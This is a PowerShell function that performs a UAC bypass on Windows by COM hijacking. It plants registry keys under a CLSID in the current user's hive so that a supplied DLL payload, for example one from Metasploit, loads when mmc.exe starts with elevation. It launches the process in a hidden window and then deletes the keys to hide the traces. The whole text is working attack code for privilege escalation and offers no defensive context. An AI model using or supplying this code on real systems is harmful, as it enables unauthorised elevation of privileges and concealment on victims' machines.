function Invoke-COMHijackBypassUAC
{
	<#
	.EXAMPLE

		.dll from the Metasploit project
		Invoke-COMHijackBypassUAC -PayloadPath C:\\Windows\\temp\\temp.dll

	.PARAMETER PayloadPath

	    The path of the .dll payload you want to run in an elevated context.
	#>
param(
	[Parameter(Mandatory = $False)]
	[String]$PayloadPath
)

$rootKey="HKCU:\SOFTWARE\Classes\CLSID\{0A29FF9E-7F9C-4437-8B11-F424491E3931}"
$inproc_key = "$rootKey\InProcServer32"
$shell_key = "$rootKey\ShellFolder"
New-Item $rootKey -Force
New-Item $inproc_key
New-Item $shell_key
New-ItemProperty -Path $inproc_key -Name "(Default)" -Value $PayloadPath
New-ItemProperty -Path $inproc_key -Name 'ThreadingModel' -Value 'Apartment'
New-ItemProperty -Path $inproc_key -Name 'LoadWithoutCOM' -Value ''
New-ItemProperty -Path $shell_key -Name 'HideOnDesktop' -Value ''
New-ItemProperty -Path $shell_key -Name 'Attributes' -PropertyType 'DWord' -Value 0xf090013d
Start-Process -File cmd.exe -ArgumentList "/c mmc.exe CompMgmt.msc" -WindowStyle Hidden
Start-Sleep -Seconds 10
Remove-Item -Path $rootKey -Force -Recurse
}